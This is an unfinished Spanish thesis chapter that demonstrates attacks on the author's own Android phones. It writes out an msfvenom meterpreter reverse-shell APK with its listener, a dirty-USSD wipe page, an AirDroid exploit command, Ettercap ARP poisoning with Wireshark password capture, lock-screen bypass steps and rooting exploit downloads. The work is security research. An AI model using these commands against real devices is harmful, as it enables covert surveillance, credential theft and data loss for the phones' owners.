Capítulo 4

Pruebas en Android

4.1 Objetivo

El objetivo general del capítulo es explorar distintas pruebas prácticas que explotan vulnerabilidades y así demostrar que existen riesgos en Android.
Por cada prueba, se explica como se usan las herramientas, demostrando su potencial y factibilidad. Se expone una gama de explotaciones de vulnerabilidades en dispositivos móviles, no sólo aquellas que afectan a Android exclusivamente, sino a otras plataformas.
En líneas generales, las pruebas que se van a realizar son las siguientes:
-Pentesting en Android: aspecto relativo a las pruebas de seguridad que se somete un sistema.
-SMS Spoofing: aspecto relacionado a la red de celulares.
-Vulnerabilidades con USSD: aspecto relativo a la tecnología de las telecomunicaciones.
-Seguridad en apps: aspecto relacionado al software que manipulan los recursos del smartphone.
-Sniffing por WiFi: aspecto relacionado a la red WiFi.
-Desbloqueo en el acceso físico: aspecto relativo al sistema operativo.
-Rooting: aspecto relativo a las acciones voluntarias del usuario con el dispositivo.

4.2 Medidas previas, entorno de trabajo y smartphones de pruebas

Se presentarán distintas pruebas que se realizan con la ayuda de herramientas. Pero antes de ejecutar las pruebas, es aconsejable tomar recaudos para no perder datos en el smartphone a utilizar.
En cuanto a la protección de los datos, se podría realizar una copia de resguardo (backup) de los archivos alojados en la tarjeta SD a otro medio. También se podrían copiar los contactos del celular a la tarjeta SIM, como una forma de respaldar los contactos.
En cuanto al entorno de pruebas, se utiliza el sistema operativo Kali Linux, dado que éste facilita algunas herramientas. Kali Linux es un Sistema Operativo que tiene como objetivo facilitar las auditorías y pruebas inherentes a la seguridad informática en general. Kali Linux tiene preinstalados más de 600 programas incluyendo Nmap (un escáner de puertos), Wireshark (un sniffer), John the Ripper (Un crackeador de passwords) y la suite Aircrack-ng (Software para pruebas de seguridad en redes inalámbricas); es un Sistema que trae herramientas que están documentadas, la mayoría son inherentes al software libre. Se usó este sistema operativo con la idea de facilitar las pruebas y tener a disposición un entorno cómodo para las mismas, dado que no se usó Kali Linux de forma amplia.
Para la ejecución de las pruebas se utilizan 3 smartphones: Motorola Defy+ (con Android 2.3.5), LG G3 (con Android 5.0.2) y Motorola Moto G (con Android 5.0.2).

4.3 Realización de las pruebas

4.3.1 Primer prueba

4.3.1.1 Introducción

Primero se parte de la definición de pentesting [PENTEST]:
	"Una prueba de penetración (también llamada pentesting) es la práctica de probar un sistema de computadora, red o aplicación web para encontrar vulnerabilidades que un atacante puede explotar."
Para probar una vulnerabilidad en Android, se usó una herramienta que sirve para realizar "pentesting", la misma se denomina "Metasploit", ésta cuenta con la colaboración de la comunidad del software libre; existen otras herramientas que también permiten realizar pruebas en Android, como por ejemplo "Android Tamer". Hay cuatro versiones de "Metasploit" [METAVER], la versión que se va a utilizar se llama "Metasploit Framework", es la más usada y la más activa entre las cuatro versiones. Esta versión es Open Source y gratuita, es utilizada principalmente por los desarrolladores de exploits y expertos en seguridad; esta versión expone una interfase por línea de comandos y tiene la funcionalidad básica en comparación con la versión paga más cara ("Metasploit Pro") [METAFRA]. Esta herramienta viene incorporada a la distribución de Kali Linux, con lo cual no se describirá cómo se instala, sólo se describirá su uso; con la ejecución de algunos de sus comandos se podrá realizar la prueba.
En esta primer prueba se pretende tener acceso a una herramienta profesional para comprobar la seguridad en Android, la prueba es sencilla y marca el inicio de la serie de demostraciones. A grandes rasgos, la serie de pasos que se sigue es la siguiente: primero se genera el exploit (con una serie de comandos), luego se transmite el exploit al smartphone víctima (con ingeniería social, por ejemplo), una vez que la víctima tiene incorporado el exploit, su autor podrá acceder a cierta información privada contenida en el smartphone, de forma remota.

4.3.1.2 Procedimiento

Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas y en ese orden. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste usa el exploit.
El archivo que se genera, es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de tener acceso a información privada del sistema víctima. Ésto se logra cuando se activa el exploit, se puede obtener información privada con la ejecución de comandos, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.

CONSOLA 1
// En una consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
# ifconfig
// Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
# msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk

CONSOLA 2
// En otra consola y en modo superusuario se deben ejecutar los siguientes comandos (uno a la vez):
msfconsole
use multi/handler
set payload android/meterpreter/reverse_tcp
set lhost X.X.X.X
set lport 8080
exploit
// Cuando se instale el exploit en el dispositivo víctima, automáticamente se abrirá un shell de comandos en esta consola, para operar con el dispositivo:
meterpreter >

4.3.1.3 Observaciones

Cuando se activó el exploit en el smartphone y la PC respondió, habilitó la ejecución de comandos de forma remota, algunos de ellos no devolvían los resultados que se esperaban.
Se logró conectar y activar la línea de comandos interna al smartphone (la cual permite acceder a la información inherente al smartphone de forma remota), para cada uno de los 3 smartphones. Una vez que se consigue este ingreso, se pueden usar varios comandos para manipular el contenido del smartphone, sin embargo, para esta prueba, no todos estos comandos funcionaron de la forma esperada. Algunos comandos devolvían mensajes de error con los 3 smartphones.

{ REALIZAR PRUEBAS ADICIONALES }

En base a esta demostración, se obtuvieron las siguientes conclusiones. Una de ellas, es que se puede generar fácilmente un exploit que obtenga acceso a un smartphone, sin el consentimiento del usuario. Otra conclusión es que esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se pueda inducir a un usuario (víctima) a instalar el exploit en su celular, haciéndole creer que es un software benigno. Cabe aclarar que esta prueba se aplica específicamente a la plataforma Android.

Estos son los comandos relevantes que se probaron una vez dentro de alguno de los 3 smartphones (obtenidos a partir del comando "help"):

Comando		Descripción 													
cat 		Lee el contenido de un archivo y lo muestra en la pantalla
cd 			Cambia el directorio
download 	Descarga un archivo
edit 		Edita un archivo con el editor Vim
lcd 		Cambia el directorio local de trabajo
lpwd		Muestra el directorio local de trabajo
ls 			Genera una lista de los archivos
mkdir		Crea un directorio
pwd 		Muestra el directorio de trabajo
rm 			Borra un archivo específico
rmdir 		Borra un directorio específico
search 		Busca archivos
upload 		Sube un archivo o un directorio
ifconfig	Muestra las interfases de red
route 		Muestra la tabla de rutado
sysinfo		Devuelve información del sistem perteneciente al smartphone 
record_mic	Graba un audio por un tiempo definido
webcam_list	Muestra la lista de las cámaras
webcam_snap	Toma una foto con una cámara
webcam_stream	Muestra un video en tiempo real de lo que se ve por una cámara
check_root	Comprueba si al dispositivo se aplicó rooting
dump_calllog	Descarga en un archivo el registro de llamadas
dump_contacts	Descarga en un archivo todos los contactos
dump_sms		Descarga en un archivo todos los SMS
geolocate		Obtiene la ubicación geográfica actual

Durante la prueba, sucedieron 2 situaciones anómalas. Por un lado, a veces la sesión de la shell conectada al smartphone se cerraba sola luego de pasado un tiempo. Por otro lado, en la ejecución de algunos comandos, después de haber hecho una espera de 20 segundos aproximadamente, se recibía este mensaje de error:
[-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.


4.3.2 Segunda prueba

4.3.2.1 Introducción

En el capítulo 1 (sección 1.5.4.4) se explicó la técnica de SMS Spoofing; en la siguiente prueba se va a demostrar que esta técnica se puede aplicar. Para realizar esta prueba se emplea un servicio ofrecido por una empresa llamada "DiGiMessaging", este servicio permite omitir los detalles de implementación de la técnica, de éso se encarga la empresa. Concretamente, el servicio permite enviar SMSs desde la Web con un caller ID arbitrario. En este caso, se va a utilizar la prueba gratuita, la cual impone una restricción en el envío de SMSs: solo se pueden enviar 3 mensajes SMS por cada cuenta gratuita.

4.3.2.2 Procedimiento

El primer paso es registrarse en el sitio web "http://www.digimessaging.com/", completando formularios con datos personales. Una vez iniciado una sesión con la cuenta recién creada, se debe dirigir al link que dice "FREE TRIAL", donde aparecerá un formulario con forma de celular. Luego se deben completar los campos del formulario de la siguiente manera: en el campo "From" se ingresa un nombre (por ejemplo, "UNLP"), en los campos que corresponden a "To" se selecciona el país Argentina y se ingresa un número de celular sin la característica del país (por ejemplo, "2215775754"); finalmente se apreta el botón "SEND". Pasado un lapso de tiempo (alrededor de 1 minuto), se recibirá un mensaje en el smartphone con el remitente que se definió en el campo "To".

{ imágen del formulario lleno de datos }

4.3.2.3 Observaciones

Con esta prueba se demostró que la aplicación de la técnica del SMS Spoofing es factible y simple, esta técnica puede afectar a cualquier celular, sin importar el sistema operativo que utilice. En este caso, se tercerizó el trabajo a alguna de las tantas empresas que ofrecen este tipo de servicio: el envío de múltiples SMSs a celulares de casi cualquier parte del mundo, con un "caller ID" o "sender ID" arbitrario; por lo tanto, esta prueba no exigió conocimientos técnicos específicos. En el caso de la empresa elegida, se notó durante las pruebas que tiene una restricción de seguridad: no permite enviar SMSs con un remitente de una entidad conocida, como un banco; lo que quiere decir que tiene listas negras para el remitente que se vaya a ingresar.
Esta prueba puede mejorarse, adquiriendo saldo o créditos para poder enviar mas de 3 mensajes. Con otras empresas sucede lo mismo, si se paga un arancel se pueden conseguir mas características.

4.3.3 Tercer prueba --- ESTA PRUEBA QUEDA EN STANDBY

4.3.3.1 Introducción

En esta prueba se toca un aspecto que involucra a las redes de celulares. Se pueden ejecutar comandos desde el celular (ya sea un smartphone o no) para interactuar con la red del proveedor de telefonía móvil por medio de códigos que forman parte del protocolo USSD, con el objetivo de dañar al celular.
Un investigador en seguridad informática llamado Ravi Borgaonkar descubrió una vulnerabilidad, que en principio afecta a los smartphones de la marca Samsung. Esta vulnerabilidad conocida como "dirty ussd", fue expuesta públicamente en la conferencia de seguridad llamada "Ekoparty" en el año 2012 [COMPMOV]. La explotación de la vulnerabilidad consiste en la destrucción de datos (reestablecimiento al estado de fábrica) de un celular a partir del acceso a un link, que en el código HTML que le corresponde a este link se usa una expresión particular "tel" que es válido para el estándar W3C [RFC3966] [COMPMOV]. Este tag permite realizar una llamada telefónica mediante el acceso al link web. Aunque en este caso, se lo va a utilizar para invocar un comando USSD, el cual se lo invoca de la misma forma que se realiza una llamada: digitando números y símbolos del teclado para luego apretar "send".
    "La capacidad de interpretar este tag no es exclusiva de los dispositivos con Android, si no de todas las plataformas, e inclusive de teléfonos de baja gama, solo es necesario que tenga un navegador móvil." [COMPMOV]
    "El problema se da en que Android corre de forma automática los comandos USSD, esto quiere decir que los ejecuta sin preguntarle al usuario." [COMPMOV]
    
El protocolo USSD (Unstructured Supplementary Service Data - Servicio suplementario de datos no estructurados) provee códigos especiales que sirven para marcar en un celular (ya sea un smartphone o no) y posibilitan la interacción con un programa incorporado en la red de celulares, cada código ejecuta un comando [TECUSSD]. Cada proveedor tiene su propio conjunto de códigos USSD. Es una tecnología heredada de las redes de telefonía móvil GSM, la cual empezó a ser popular en la década del 90, pero aún esta activa y puede ser usada, forma parte de los protocolos de telefonía de segunda generación (2G).
La prueba consiste en usar este protocolo de comunicación para destruir datos, y así demostrar que se lo puede usar con fines maliciosos. Para ello, se usa un comando USSD que reestablece al estado de fábrica a algunos smartphones (produciendo una pérdida de datos) y/o puede llegar a dejar en un estado obsoleto al chip SIM. Este código corresponde a "*2767*3855#", que su ejecución en algunos celulares (como algunos modelos viejos de la marca Samsung) logra un reestablecimiento al estado de fábrica ("wipe-out").
La forma en que se usan las expresiones "tel" es muy simple, se escribe el número telefónico luego de la expresión "tel=" dentro del atributo "href" en el tag "a" [RFC3966], por ejemplo: un enlace podría ser el siguiente:
<a href="tel:+54-221-4569900" target="_blank">IMEI</a>
Generalmente, para enviar las URLs por Internet se deben codificar algunos caracteres especiales como "#" y " " [RFC3986]. Éstos se los convierte de la siguiente forma: la expresión comienza con un "%" y sigue con 2 dígitos hexadecimales correspondientes a la tabla ASCII.
Existen otras formas de ser atacado: SMS que inviten al usuario a acceder al link con engaños, códigos QR que apunten al link definido, enlaces recortados, etc. Una forma de probar si nos afecta esta vulnerabilidad es accediendo a la dirección [SEGUINF]: http://dylanreeve.com/phone.php, si se ejecuta el código USSD directamente mostrando el código IMEI (acción totalmente inofensiva), entonces ésto indica que el celular es propensos a sufrir el ataque "dirty ussd".
Para que esta vulnerabilidad afecte a un smartphone, se tienen que cumplir 2 condiciones: el celular debe ser capaz de acceder a links que contienen números telefónicos marcando directamente y el proveedor de telefonía móvil debe admitir el comando USSD que realiza el "wipe-out" del equipo.
No obstante, la vulnerabilidad ya fue controlada, los sistemas operativos actuales ya no cuentan con este tipo de riesgos, éstos evitan la ejecución directa de este tipo de comandos. Para los smartphones que aún posean la vulnerabilidad, se puede instalar una app de un tercero.

[TECUSSD] [http://searchnetworking.techtarget.com/definition/USSD]
[COMPMOV] [http://computacionmovil-ar.blogspot.com.ar/2012/09/explicacion-de-la-vulnerabilidad-de.html]
[RFC3966] [http://www.rfc-editor.org/rfc/rfc3966.txt]
[PCMAGSE] [http://securitywatch.pcmag.com/none/303097-dirty-ussd-hack-wipes-samsung-phones-is-yours-vulnerable]
[SEGUINF] [http://blog.segu-info.com.ar/2012/09/el-ataque-ussd-codes-en-android-borrado.html]
[RFC3986] [https://tools.ietf.org/html/rfc3986]
[REFERENCIA INTERNA] [https://www.youtube.com/watch?v=EzGIaPYmNZw] { El pibe hindú que explica como describe a dirty USSD }

4.3.3.2 Procedimiento

Para notar los efectos de esta explotación se puede usar el siguiente vector de ataque: un link recortado, el cual oculta su contenido original y quizás aparenta ser inofensivo con ayuda de la ingeniería social.
(La prueba consiste en el acceso a un link que apunte a la siguiente dirección "tel:*2767*3855#".)
El código html del archivo "index.html":

<!doctype html>
<html class="no-js" lang="">
    <head>
        <meta charset="utf-8">
        <title>Prueba de "Dirty USSD"</title>
    </head>
    <body>
        <p>Esta página intenta demostrar los efectos de la vulnerabilidad "Dirty USSD"</p>
        <a href="tel:*%2306%23" target="_blank">Wipe out</a>
    </body>
</html>

<a href="tel:*%2306%23" target="_blank">IMEI</a>

Luego se debe ejecutar en una consola (dentro de la carpeta que contiene "index.html"):
$ python -m SimpleHTTPServer 8000

4.3.3.3 Observaciones

Esta prueba expone una vulnerabilidad que es explotada fácilmente, pero afecta a algunos equipos relativamente viejos. Sin embargo, ésto nos demuestra que existen vectores de ataque como los códigos QR, links recortados (que suelen emplearse en twitter), links enviados por sms, etc. En el futuro se podrían descubrir métodos de explotación que utilicen los mismos vectores de ataque, aunque se podrían prevenir sus efectos con la incorporación de cierta educación en el usuario para que preste atención y analice este tipo de contenido.
El ataque se puede realizar en el smartphone "Defy+" porque ejecuta el código USSD directamente, sin embargo no se pudo ejecutar el comando que realiza el reestableciemiento al estado de fábrica porque el proveedor no lo soporta, en este caso, el proveedor es "Personal".
Se puede evitar este ataque con apps de terceros que marcan números telefónicos, como por ejemplo "ExDialer" y "Dialer One".

[Una nota acerca de este bug] [http://gizmodo.com/5946334/samsung-security-bug-can-wipe-out-your-galaxy-phone-updating]
[Android Central] [http://www.elandroidelibre.com/2012/09/todo-sobre-el-ultimo-problema-de-seguridad-de-android-en-que-consiste-y-como-saber-si-estas-afectado.html]

4.3.4 Cuarta prueba [ COMPLETAR!!! ]

4.3.4.1 Introducción

Las diversas apps (ya sean legítimas o no) que se pueden adquirir desde los diversos medios de distribución pueden contener bugs de seguridad, los cuales pueden ser explotados para obtener privilegios en el acceso al sistema operativo, hacer daño, etc. Esta prueba consiste en demostrar otro aspecto a tener en cuenta en los sistemas operativos móviles: la seguridad en las apps.
Para realizar esta prueba se utiliza una app legítima llamada "AirDroid", la cual es una app bastante popular. AirDroid sirve para controlar y administrar uno o varios dispositivos móviles con Android desde una PC, desde ésta se puede enviar mensajes SMS, transferir archivos, usar el GPS, usar la cámara de fotos, acceder a los contactos, etc. [AIRDROI]; para conectarse utiliza una conexión Wi-Fi.
En esta prueba se explota una vulnerabilidad específica de "AirDroid" con la ayuda de un "exploit". En este caso, se usa un "script" escrito en "Python" que fue obtenido de un registro público de "exploits" llamado "Exploit Database" [EXPLODB]. Esta vulnerabilidad ya fue resuelta, o sea que ya se publicó una actualización que corrige este bug; entonces, para que funcione esta demostración, se necesita adquirir e instalar una versión anterior a la versión que contiene la corrección. Para ello, se acude a un repositorio alternativo llamado "Apk 4 Fun" [APKFFUN] que tiene un historial de versiones de varias apps, junto con los paquetes instaladores. En definitiva, para lo que nos compete, este repositorio aloja varias versiones viejas de "AirDroid", en este caso se va a usar la versión 3.1.3, dado que a partir de la versión 3.1.4 ya se corrigió este bug [AIRFORU]. Cabe aclarar que el marketplace oficial Google Play está descartado para obtener la app, debido a que tiene la versión más reciente.
Este exploit permite que una PC que se encuentra conectada en una red pueda transferir archivos a un dispositivo cualquiera que esté usando AirDroid (dentro de la misma red), sin que éste lo perciba. En el marco de esta prueba, se tienen los siguientes elementos: una red local en la cual está conectado un smartphone y 2 PCs. En el entorno concreto de esta prueba se usa: una notebook con el sistema operativo "Windows 7" que usa AirDroid desde la web, un smartphone "LG G3" con Android 5.0.2 ("Lollipop") que lleva instalada la app AirDroid, y la máquina atacante es una notebook con Kali Linux que lleva la versión 2.7 de Python. La interacción entre ellos sucede así: el smartphone y la PC comparten datos por medio de la app "AirDroid", actividad normal que llevan a cabo; sin embargo, desde otra PC dentro de la misma red local, se van a transferir archivos al smartphone de forma silenciosa, sin la necesidad de estar autenticado en la aplicación AirDroid, ésto se puede lograr gracias a la ayuda del "exploit".

[AIRFORU] [http://forums.airdroid.com/viewtopic.php?f=6&t=15870]
[EXPLODB] [https://www.exploit-db.com/exploits/37504/]
[APKFFUN] [http://www.apk4fun.com/apk/56479/]
[AIRDROI] [https://www.airdroid.com/]

4.3.4.2 Procedimiento

Primero, en una PC se debe crear una cuenta de AirDroid e iniciar sesión con esa misma cuenta desde el sitio web de AirDroid que emula un escritorio (https://web.airdroid.com/). Con el smartphone se debe descargar, instalar y ejecutar la versión 3.1.3 de la app AirDroid con la ayuda del repositorio llamado "APK4Fun" (http://www.apk4fun.com/).
Luego, desde la PC que tiene Linux, se debe ejecutar el script que explota la vulnerabilidad. Los parámetros más importantes de este script son: IP y puerto del smartphone víctima, nombre del archivo a enviar y ubicación del archivo dentro del filesystem de la víctima. Por ejemplo:
$ python exploit.py 192.168.0.43 8888 prueba.txt prueba.txt /sdcard
En donde, el primer parámetro es el nombre del archivo que se comporta como exploit, el segundo y tercer parámetro es la dirección IP y el puerto del smartphone víctima, respectivamente, el cuarto parámetro es el nombre que se le va a asignar al archivo transferido, el quinto parámetro define el nombre del archivo local que se va a transferir, el sexto parámetro es la ubicación en el smartphone (donde se va a depositar al archivo).

4.3.4.3 Observaciones

{ FALTAN PRUEBAS CON OTROS DISPOSITIVOS } { FUNCIoNó con los smartphones LG G3 y Moto G 2, pero no se pudo instalar la app en Defy+ }
En esta prueba se consiguió infiltrar archivos en un smartphone por medio de la app "AirDroid", sin el consentimiento del usuario y sin que lo perciba. No se analizó la implementación del exploit, sino los resultados de su aplicación. En este caso, esta prueba solo afecta a los dispositivos con Android; sin embargo, queda claro que las aplicaciones móviles, en general pueden contener bugs de seguridad que pueden ser aprovechados por exploits, se demostró que ésto también puede suceder en otra plataforma móvil.

4.3.5 Quinta prueba [ COMPLETAR!!! ]

4.3.5.1 Introducción

Los smartphones actuales pueden conectarse a una red Wi-Fi, sin embargo la incorporación de esta tecnología permite que un tercero pueda capturar información del smartphone empleando técnicas conocidas y probadas en las PCs, como sniffing. Esta prueba se puede aplicar en otros entornos móviles, no sólo en Android. Acá se demuestra que se puede monitorear el tráfico que entra y sale de un smartphone que está conectado a una red WiFi, sin el consentimiento del usuario. Para ello se utilizan 2 herramientas: "Ettercap" y "Wireshark", las cuales corresponden a las 2 etapas en que se divide esta prueba.

Ettercap es un conjunto de herramientas que sirven para realizar ataques "man-in-the-middle" en una red local [SECETTE]. Esta aplicación se fue enriqueciendo con más y más funciones durante el transcurso del proceso de desarrollo, lo que lo transformó en una herramienta flexible y poderosa para este tipo de ataques. Tiene funciones para efectuar análisis de redes y hosts, entre otras [LINETTE]. En esta prueba se lo usa para realizar la primer etapa, configurar una PC atacante para que pueda interceptar los paquetes que se transmitan entre un router y un smartphone. Para ello, se realiza un ataque ARP spoofing con la herramienta Ettercap. { EXPLICAR ARP SPOOFING }
[ETTERCA] [https://ettercap.github.io/ettercap/]
[SECETTE] [http://sectools.org/tool/ettercap/]
[LINETTE] [http://linux.die.net/man/8/ettercap]

[REF INT] [https://github.com/Ettercap/ettercap]
[REF INT] [https://www.sans.org/reading-room/whitepapers/tools/ettercap-primer-1406]

Wireshark sirve para analizar paquetes y es la herramienta más popular que realiza este tipo de estudios; permite ver lo que sucede en la red con un alto nivel de detalle [WIRESHA], permite una inspección profunda de cientos de protocolos. Realiza una captura en vivo para su posterior análisis de forma offline. En esta prueba se usa Wireshark para llevar a cabo la segunda etapa, que estudia los paquetes que intercepta el host atacante. El objetivo es demostrar que se pueden capturar paquetes con intensiones maliciosas, como por ejemplo, el robo de una contraseña de una cuenta de usuario.
[WIRESHA] [https://www.wireshark.org/about.html]

4.3.5.2 Procedimiento

[PRIMER ETAPA]
En la primer etapa, en que se utiliza la herramienta "Ettercap", se deben realizar los siguientes pasos.

Se debe abrir la aplicación, ésto se puede realizar desde una consola ejecutando como superusuario o "root":
# ettercap -G
Una vez dentro de la aplicación, dentro de la interfase gráfica, se debe preparar el ataque. Para ello se debe desplegar el menú "Sniff" para seleccionar el ítem "Unified sniffing". Aparece una ventana en que se debe elegir la interfase inalámbrica, en el caso de esta prueba, se llama "wlan0" y presionar el botón de aceptar.
Después, para explorar la red en busca del host que queremos espiar, se busca dentro del menú "Hosts" el ítem "Scan for hosts". Con este comando se explora en la red a la cual está conectada la interfase que se eligió en el punto anterior, en busca de hosts.
A continuación, se puede ver la lista de los nodos de la red, desplegando el menú "Hosts" y eligiendo el ítem "Hosts list". En este listado, se debe continuar configurando el ataque definiendo la intrusión entre 2 hosts (el router y el smartphone). Entonces, por un lado se debe seleccionar la IP del smartphone del listado y presionar el botón "Add to target 1", y por el otro lado, se debe seleccionar la IP del router y presionar el botón "Add to target 2".

{ EXPLICAR COMO SE PUEDEN IDENTIFICAR LAS IPs DE LOS HOSTS }
Cabe aclarar que ... para saber las IPs ... ( nos puede servir el comando "route -n" para conocer la IP del router )
Para cerrar la configuración del ataque, se debe elegir dentro del menú "Mitm", el ítem "Arp Poisoning". Con ésto aparece una ventana en la que se debe tildar el casillero que dice "Sniff remote conections".
Finalmente, para efectuar el ataque, en el menú se elige "Start Sniffing".

[SEGUNDA ETAPA]
En la segunda etapa se usa "Wireshark" y se deben realizar los siguientes pasos.

Desde la PC, se debe abrir la aplicación, para ello se puede ejecutar desde una consola como superusuario o "root":
# wireshark
Probablemente se muestre una o dos advertencias indicando que el usuario que abrió la aplicación es "root", estos avisos deben ser ignorados.
Una vez dentro de la aplicación, dentro de la interfase gráfica, se debe ejecutar la captura de paquetes. Para ello se debe desplegar el menú "Capture" para selecionar el ítem "Interfaces...". Aparece una ventana en la que una lista con interfases de red; se debe seleccionar la que se conecta a la red local. En el caso concreto de esta prueba se debe seleccionar la interfase, que se conecta a un red via Wi-Fi, denominada "wlan0"; acto seguido se debe presionar el botón "Start". Con ésto se inicia la captura de paquetes que entran y salen de la interfase de red seleccionada.

Mientras se capturan paquetes con la PC, desde el smartphone se debe ingresar a un sitio web que demande un inicio de sesión para acceder a cierto contenido privado. Para esta prueba específica [SAMCLAS], se utiliza el sitio web: "gogo6.com", en éste se debe dirigir al inicio de sesión accediendo al enlace "sign in" en la parte superior a la derecha. Luego, se debe completar los datos del formulario: nombre de usuario y contraseña, acto seguido apretar el botón "sign in".

Cuando se termina de trabajar con el smartphone, se debe retornar a la PC para detener la captura de paquetes. Con la captura realizada, se deben filtrar los paquetes así: en el campo "Filter:" escribir "frame contains gmail.com". El filtro aplicado sirve para seleccionar los paquetes que interesan, y a partir de un paquete, se debe extraer la información que interesa. El filtro se basa en la idea de que la dirección de e-mail ingresada como identificador de usuario pertenece a GMail.
Seleccionar uno de los paquetes que aparecen como resultado del filtrado, hacer click secundario en él para que aparezca un menú emergente, elegir la opción que dice "Follow TCP Stream". Se muestra una nueva ventana con un texto en el centro, se debe usar la herramienta de búsqueda para localizar el texto "gmail.com", se verá que al lado de este texto se puede encontrar la contraseña ingresada, en este caso hay un texto "password" que señala cuál es la contraseña ingresada.

[SAMCLAS] [https://samsclass.info/120/proj/p3-wireshark.htm] (usando Wireshark).
[SNIFFTU] [http://hacking-pentesting.blogspot.com.ar/2013/09/sniffer-espiando-nuestra-red-local.html] (usando Ettercap).

Fuente:
Otros vectores de ataque:
https://en.wikipedia.org/wiki/DNS_hijacking
https://en.wikipedia.org/wiki/ARP_spoofing

4.3.5.3 Observaciones

En este caso, se puede realizar un ataque del tipo "man-in-the-middle" porque los datos de la cuenta (usuario y contraseña) no estan encriptados. En el caso de que el sitio web utilice una tecnología de seguridad para encriptar los datos que se transmitan entre el navegador y el servidor (como lo hace "GMail", por ejemplo), no se podría ubicar la información que interesa para este caso.
La primer etapa se realiza mécanicamente, o sea que casi siempre se van a efectuar los mismos pasos; en cambio, la segunda etapa puede requerir un poco de análisis para tomar de decisiones. Por ejemplo, el criterio del filtro puede cambiarse por uno más preciso quizás, para ello se podría inspeccionar el código HTML de la página web, y allí averiguar el nombre de los campos del usuario y contraseña que se envían al servidor.

4.3.6 Sexta prueba [ COMPLETAR!!! ]

4.3.6.1 Introducción

El tamaño y peso del smartphone lo hacen portable para que el usuario pueda llevarlo consigo a cualquier lugar, para poder aprovechar sus funciones en cualquier momento. Sin embargo, esta característica lo expone a riesgos, dado que el smartphone puede estar al alcance de una persona que no sea el dueño y que tiene malas intenciones. En esta prueba se va a demostrar que existen formas para tener acceso a la información contenida en el smartphone, eludiendo medidas de seguridad, como el bloqueo de la pantalla. Se realizarán 2 pruebas: la primera consiste en forzar al smartphone a volver al estado de fábrica ("hard reset") con la finalidad de poder volver a usar el smartphone (sin la pantalla bloqueada) y poder ver lo que contiene la tarjeta SD; la segunda prueba consiste en aprovechar las facilidades que brinda Android para el desarrollo de apps, pero con intenciones maliciosas. Esta última se apoya en que cuando un smartphone se conecta a la PC y el mismo está en "modo desarrollo", se puede tener acceso al filesystem del smartphone por la línea de comandos.
Previo a la realización de las pruebas, es recomendable tomar precauciones. Se podría extraer la tarjetas SIM y la tarjeta de memoria SD, dado que no hay certeza de que esta operación deje a la tarjeta SIM en el mismo estado que estaba antes de la prueba.

4.3.6.2 Procedimiento

- Apagar el smartphone.
- Presionar botón para bajar el volúmen y el botón de encendido a la vez.
- Presionar botón para subir y bajar el volúmen a la vez.
- Se muestra un menú, en el cual se debe elegir "Wipe data/factory reset".

[DEV]
Otra posibilidad es ingresar al sistema mediante shell si el equipo tiene habilitado el modo desarrollo.
http://null-byte.wonderhowto.com/how-to/locked-out-your-phone-heres-you-bypass-android-pattern-lock-screen-0138807/

4.3.6.3 Observaciones

Los pasos descritos dependen del modelo del smartphone utilizado. Para volver al estado de fábrica a otro modelo de smartphone se debe consultar el sitio web llamado "Hard reset" (http://www.hard-reset.com). Lo que queda demostrado es que se puede dañar la información contenida de un smartphone fácilmente cuando el usuario descuida físicamente al equipo.

4.3.7 Séptima prueba [ COMPLETAR!!! ]

4.3.7.1 Introducción

El proceso de "rooting" de dispositivos con Android le permite al usuario tener control privilegiado (permisos de superusuario) sobre el sistema operativo; sin embargo, estos usuarios deben manajerse con cuidado porque pueden causar daños al equipo de forma involutaria, se explicó este tema en el capítulo 1 (sección 1.5.4.2). Las aplicaciones que posibilitan el "rooteo" no dan ninguna garantía de que no van a dañar al smartphone que se va a someter, o sea que el hecho de aplicar este proceso ya es un riesgo en sí mismo, a parte de las consecuencias que acarrea. Esta prueba consiste en la realización de este proceso, para ello se obtuvo información del procedimiento que se debe realizar, a partir de foros, blogs, páginas web personales, etc.
En cuanto a la preparación del ambiente para esta prueba, se utilizó una PC con Windows 7 porque el exploit funciona en Windows.
{ EXPLICAR QUE TAMBIÉN SE USÓ LINUX :) }
El proceso de ejecución del exploit se lo puede dividir en 2 etapas: instalación de drivers y rooteo. Primero se deben instalar los drivers que provee el fabricante del smartphone para que el sistema operativo lo detecte y así poder ejecutar comandos en el mismo; esencialmente, la herramienta de línea de comandos llamada "adb" es la que ayuda a realizar el "rooting", con lo cual se debe probar que funcione "adb" antes de ejecutar el exploit. Finalmente, se debe ejecutar el exploit.
Para este caso, se utilizó un smartphone modelo "Defy Plus", de la marca "Motorola".

http://www.taringa.net/comunidades/motoroladefy/7710427/Consulta-Rootear-motorola-defy-plus.html [Fundamental!!!]
http://www.taringa.net/comunidades/motoroladefy/5277669/Pedido-Root-defy-plus-2-3-5.html [Accesorio]
° Se bajan los drivers desde acá (son para Windows):
https://motorola-global-portal.custhelp.com/app/answers/detail/a_id/88481
° Se descarga el exploit que permite el rooting del smartphone desde acá:
http://www.mediafire.com/?5d82batkh7hwm6z
° Se instala la aplicación de escritorio "Motorola Device Manager", el cual instala los drivers para que Windows reconozca el smartphone conectado. Es un típica instalación de Windows (no requiere configuración).
° Se enchufa el smartphone al puerto USB y se activa la Depuración USB (Menu / Aplicaciones / Desarrollo).
° Se descomprime el paquete que contiene el exploit en una carpeta y desde la línea de comandos se debe dirigir a esa ubicación. Luego, ejecutar "adb.exe devices" para asegurarse que el smartphone ha sido detectado, si aparece en el listado se prosigue.
° Se ejecuta el exploit, el mismo no tiene complicaciones: se presiona la tecla "enter" por cada mensaje que aparece hasta que indica que se terminó el proceso.

4.3.7.2 Procedimiento

